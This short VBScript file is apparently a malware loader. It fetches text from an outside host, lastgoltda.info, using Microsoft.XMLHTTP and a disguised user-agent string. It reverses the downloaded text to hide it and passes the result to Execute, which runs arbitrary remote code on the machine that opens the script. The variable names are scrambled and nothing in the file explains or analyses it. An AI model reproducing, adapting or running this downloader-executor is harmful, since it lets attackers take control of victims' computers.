NwCgS="p4ovL5vOLXRAkyzyIPz9qD07O"
URL="http://lastgoltda.info/?c=r&" & NwCgS
set DYWp4=CreateObject("Microsoft.XMLHTTP")

DYWp4.open "GET",URL,false
DYWp4.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
DYWp4.setRequestHeader "User-Agent", "RemoveIT"
DYWp4.send "Z"

For i = Len(DYWp4.responsetext) to 1  Step-1
    var= Mid(DYWp4.responsetext,  i  , 1)
    Kh7pm = Kh7pm & var
Next

execute "Execute Kh7pm & NwCgSDYWp4"
